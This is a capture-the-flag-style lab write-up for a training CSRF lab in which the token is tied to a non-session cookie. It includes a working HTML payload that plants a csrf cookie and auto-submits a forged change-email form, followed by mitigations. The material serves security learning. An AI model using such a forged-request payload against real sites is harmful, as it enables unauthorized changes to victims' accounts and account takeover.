# Lab Name
CSRF where token is tied to non-session cookie

## Vulnerability
Cross-Site Request Forgery (CSRF) – Token Tied to Non-Session Cookie

## Objective
Exploit a CSRF vulnerability by injecting a matching CSRF cookie and token to change the victim's email address.

## Entry Point
Change Email functionality

## Exploitation Type
Cross-Site Request Forgery (CSRF)

## Methodology
1. Open the lab and log in using the provided credentials

2. Navigate to the "My Account" page

3. Change the email address and intercept the request using Burp Suite

4. Observe that the application uses a CSRF token that is tied to a csrf cookie instead of the user's session

5. Verify that both the csrf cookie and csrf parameter contain the same value

6. Create a CSRF exploit that injects a custom csrf cookie into the victim's browser

7. Include the same value in the csrf parameter of the forged request

8. Upload the exploit to the Exploit Server

9. Deliver the exploit to the victim

10. When the victim visits the malicious page, the browser sets the attacker-controlled csrf cookie and submits the forged request with the matching token

11. Observe that the victim's email address is changed successfully, solving the lab

## Payload Used

```html
<html>
  <body>
    <script>
      document.cookie="csrf=nd1b1YJVa4oEkqrVZJzXEUv2rSXpBdyk";
    </script>

    <form action="https://0a43004603b8997b809e218b00e200c5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="xyz@gmail.com">
      <input type="hidden" name="csrf" value="nd1b1YJVa4oEkqrVZJzXEUv2rSXpBdyk">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Result
Successfully bypassed the CSRF protection by supplying a matching attacker-controlled CSRF cookie and token, resulting in an unauthorized email change.

## Impact
- Unauthorized account modifications
- Bypass of CSRF protection
- User impersonation
- Account takeover opportunities
- Sensitive information modification

## Mitigation
- Bind CSRF tokens to the authenticated user's session
- Do not rely on non-session cookies for CSRF validation
- Generate unique, unpredictable CSRF tokens
- Validate Origin and Referer headers
- Use SameSite cookies for additional protection

## Learning
CSRF tokens should always be bound to the authenticated user's session.
If the application validates only that the CSRF token matches a non-session cookie, attackers can inject both values and bypass the protection completely.
